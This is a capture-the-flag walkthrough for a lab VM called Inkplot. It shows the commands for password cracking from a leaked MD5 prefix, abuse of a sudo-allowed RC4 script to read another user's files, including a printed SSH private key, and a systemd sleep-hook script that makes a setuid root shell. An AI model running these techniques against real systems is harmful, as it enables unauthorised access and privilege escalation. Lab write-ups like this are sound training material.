# Inkplot

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.172:22
Open 10.0.2.172:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.172
PORT     STATE SERVICE   REASON  VERSION
22/tcp   open  ssh       syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
3000/tcp open  websocket syn-ack Ogar agar.io server
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (3000)

```bash
└─$ curl 10.0.2.172:3000 -i
HTTP/1.1 426 Upgrade Required
Content-Length: 16
Content-Type: text/plain
Date: Sat, 03 Jan 2026 14:09:41 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Upgrade Required 
```

Use HTTP2 instead of 1.1
```bash
└─$ curl 10.0.2.172:3000 -i --http2
HTTP/1.1 400 Bad Request
Connection: close
Content-Type: text/html
Content-Length: 22

Invalid Upgrade header
```

Still invalid. The value `h2c` doesn't seem to be valid.
```bash
└─$ curl 10.0.2.172:3000 -i --http2 -v
...
> Upgrade: h2c
...
```

- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Upgrade](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Upgrade)

```bash
└─$ curl 10.0.2.172:3000 -H 'Upgrade: websocket' -H 'Connection: Upgrade'
Missing or invalid Sec-WebSocket-Key header 
```

- [https://github.com/vi/websocat](https://github.com/vi/websocat)

```bash
└─$ websocat ws://10.0.2.172:3000/
Welcome to our InkPlot secret IRC server
Bob: Alice, ready to knock our naive Leila off her digital pedestal?
Alice: Bob, I've been dreaming about this for weeks. Leila has no idea what's about to hit her.
Bob: Exactly. We're gonna tear her defense system apart. She won't see it coming.
Alice: Poor Leila, always so confident. Let's do this.
Bob: Alice, I'll need that MD5 hash to finish the job. Got it?
Alice: Yeah, I've got it. Time to shake Leila's world.
Bob: Perfect. Release it.
Alice: Here it goes: d51540...
*Alice has disconnected*
Bob: What?! Damn it, Alice?! Not now!
Leila: clear
```

```python
from hashlib import md5
import sys
from multiprocessing import Pool

def hash_password(password):
    # password = password.strip() # Not found without newline
    password_hash = md5(password.encode()).hexdigest()
    if password_hash.startswith("d51540"):
        print(f"Found matching password: {password}", end='')
        return f"Found matching password: {password}"
    return False # f"MD5: {password_hash}, Password: {password}"

if __name__ == "__main__":
    with open(sys.argv[1], encoding="latin-1") as f:
        passwords = f.readlines()

    with Pool() as pool:
        results = pool.map(hash_password, passwords)
```

```bash
Found matching password: palmira
Found matching password: intelinside
```

## SSH

::: info Note
`leila:intelinside`
:::

```bash
└─$ sshpass -p 'intelinside' ssh leila@10.0.2.172
╰─$ id
uid=1003(leila) gid=1003(leila) groups=1003(leila),100(users)
```

## Privilege Escalation (pauline)

```bash
╰─$ sudo -l
sudo: unable to resolve host inkplot: Name or service not known
Matching Defaults entries for leila on inkplot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User leila may run the following commands on inkplot:
    (pauline : pauline) NOPASSWD: /usr/bin/python3 /home/pauline/cipher.py*
```

```bash
╰─$ ls -l /home/pauline/cipher.py
-rw-r--r-- 1 pauline pauline 1738 Aug  1  2023 /home/pauline/cipher.py
```

```python
import os
import json
import argparse
from Crypto.Cipher import ARC4
import base64

with open('/home/pauline/keys.json', 'r') as f:
    keys = json.load(f)

crypt_key = keys['crypt_key'].encode()

def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        file_content = f.read()

    cipher = ARC4.new(key)
    encrypted_content = cipher.encrypt(file_content)
    encoded_content = base64.b64encode(encrypted_content)
    base_filename = os.path.basename(filepath)
    with open(base_filename + '.enc', 'wb') as f:
        f.write(encoded_content)

    return base_filename + '.enc'

def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        encrypted_content = f.read()

    decoded_content = base64.b64decode(encrypted_content)
    cipher = ARC4.new(key)
    decrypted_content = cipher.decrypt(decoded_content)

    return decrypted_content

parser = argparse.ArgumentParser(description='Encrypt or decrypt a file.')
parser.add_argument('filepath', help='The path to the file to encrypt or decrypt.')
parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt the file.')
parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt the file.')

args = parser.parse_args()

if args.encrypt:
    encrypted_filepath = encrypt_file(args.filepath, crypt_key)
    print("The encrypted and encoded content has been written to: ")
    print(encrypted_filepath)
elif args.decrypt:
    decrypt_key = input("Please enter the decryption key: ").encode()
    decrypted_content = decrypt_file(args.filepath, decrypt_key)
    print("The decrypted content is: ")
    print(decrypted_content)
else:
    print("Please provide an operation type. Use -e to encrypt or -d to decrypt.")
```


Broken Cryptographic Algorithm (ARC4/RC4)
The script uses **ARC4** (Alleged RC4). RC4 is considered cryptographically broken and is prohibited in modern security standards (like TLS 1.2+).
- **Keystream Bias:** RC4 is a stream cipher. If the same key is reused, it becomes trivial to decrypt data without the key using a **Known Plaintext Attack**.
- **Vulnerability:** RC4 does not use a **Nonce** or **Initialization Vector (IV)**. This means the same key always produces the exact same stream of "random" bytes.

```bash
╰─$ sudo -u pauline python3 /home/pauline/cipher.py -e /home/pauline/keys.json
╰─$ base64 -d keys.json.enc > keys.json.dec
╰─$ sudo -u pauline python3 /home/pauline/cipher.py -e ./keys.json.dec
╰─$ base64 -d keys.json.dec.enc
{
    "crypt_key": "aLLtBh0BVCFSvfZ203sM"
}
```

```bash
╰─$ read_file_as_pauline () {
    local file="$1"
    local filename=$(basename -- "$file")
    sudo -u pauline python3 /home/pauline/cipher.py -e "$file"
    base64 -d "$filename.enc" > "$filename.dec"
    sudo -u pauline python3 /home/pauline/cipher.py -e "$filename.dec"
    base64 -d "$filename.dec.enc"
}

╰─$ read_file_as_pauline /home/pauline/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ nano id_rsa.pauline
└─$ chmod 600 id_rsa.pauline
└─$ ssh -i id_rsa.pauline pauline@10.0.2.172
...
Auto-standby now activated after 2 min of inactivity
...
╰─$ id
uid=1000(pauline) gid=1000(pauline) groups=1000(pauline),100(users),1002(admin)
```

### User.txt

```bash
╰─$ cat user.txt
a2c145eb8279c2f920de6871bef794fa
```

## Privilege Escalation (root)

```bash
╰─$ find / -user admin  -ls 2>/dev/null
╰─$ find / -group admin -ls 2>/dev/null
   918898      4 drwxrwx---   2 root     admin        4096 Aug  2  2023 /usr/lib/systemd/system-sleep
```

- [https://wiki.archlinux.org/title/Power_management/Suspend_and_hibernate#Hooks_in_/usr/lib/systemd/system-sleep](https://wiki.archlinux.org/title/Power_management/Suspend_and_hibernate#Hooks_in_/usr/lib/systemd/system-sleep)

```bash
╰─$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > hi.sh
╰─$ chmod +x hi.sh 
```

Wait 2 minutes

```bash
Broadcast message from root@inkplot (Sat 2026-01-03 16:46:03 CET):
The system will suspend now!
```

After above message the machine went full silent mode, even ports got closed. Restarting VM or just spamming enter inside VM made machine active again.

```bash
╰─$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(pauline) gid=1000(pauline) euid=0(root) groups=1000(pauline),100(users),1002(admin)
```

### Root.txt

```
rootbash-5.2# cat /root/root.txt
4d9089c262be4a03e3ebfdaff0a8f7c6
```